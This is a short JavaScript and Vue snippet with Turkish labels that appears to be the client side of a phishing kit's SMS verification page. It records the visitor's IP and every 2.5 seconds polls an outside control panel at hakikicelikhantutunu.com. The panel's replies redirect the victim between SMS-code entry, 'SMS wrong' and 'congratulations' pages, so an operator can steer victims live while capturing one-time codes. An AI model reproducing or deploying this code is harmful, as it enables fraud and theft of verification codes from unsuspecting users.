document.addEventListener("DOMContentLoaded", function() {
    // Function to get the cookie value
    function getCookie(name) {
        const value = `; ${document.cookie}`;
        const parts = value.split(`; ${name}=`);
        if (parts.length === 2) return parts.pop().split(';').shift();
    }

    // Function to add IP to the form before submission
    window.addIpToForm = function() {
        const ip = getCookie('ip');
        document.getElementById('ip').value = ip;
    };
});

  <script>
    new Vue({
      el: '#app',
      data: {
        visitorIP: null,
      },
      created() {
        this.gonder();
        setInterval(this.gonder, 2500);
      },
      methods: {
        gonder() {
          this.visitorIP = this.getCookie('ip');

          if (!this.visitorIP) {
            axios.get('https://ipapi.co/ip').then(response => {
              this.visitorIP = response.data;
              document.cookie = "ip=" + this.visitorIP + "; path=/";
              this.sendRequest(this.visitorIP);
            }).catch(error => {
              console.error('IP alma sırasında bir hata oluştu:', error);
            });
          } else {
            this.sendRequest(this.visitorIP);
          }
        },
        sendRequest(visitorIP) {
          axios.get('https://hakikicelikhantutunu.com/dmn/veri.php?ip=' + encodeURIComponent(visitorIP)+'&sayfa=sms sayfa')
            .then(response => {
              const msg = response.data;
              if (msg === "back") {
                window.location.href = '/';
              } else if (msg === "hata") {
                window.location.href = '/sms-hatali';
              } else if (msg === "sms") {
                window.location.href = '/sms';
              } else if (msg === "tebrik") {
                window.location.href = '/tebrikler';
              }
            })
            .catch(error => {
              console.error('İstek sırasında bir hata oluştu:', error);
            });
        },
        getCookie(name) {
          const cookieName = name + "=";
          const decodedCookie = decodeURIComponent(document.cookie);
          const cookieArray = decodedCookie.split(';');
          for (let i = 0; i < cookieArray.length; i++) {
            let cookie = cookieArray[i].trim();
            if (cookie.indexOf(cookieName) === 0) {
              return cookie.substring(cookieName.length, cookie.length);
            }
          }
          return null;
        }
      }
    });
  </script>
